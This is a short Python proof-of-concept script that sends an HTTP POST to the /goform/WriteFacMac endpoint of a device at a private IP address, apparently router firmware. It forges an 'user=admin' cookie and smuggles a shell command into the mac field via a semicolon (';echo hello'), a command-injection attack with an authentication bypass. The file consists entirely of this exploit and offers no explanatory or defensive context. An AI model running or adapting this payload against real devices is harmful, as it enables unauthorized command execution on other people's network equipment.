import requests

ip = '192.168.204.143'
url = f'http://{ip}/goform/WriteFacMac'
headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Cookie': 'user=admin',
    'Connection': 'close',
}
payload = 'mac=00:01:02:11:22:33;echo%20hello'
r = requests.post(url, headers=headers, data=payload)
print(r.status_code, r.text[:200])
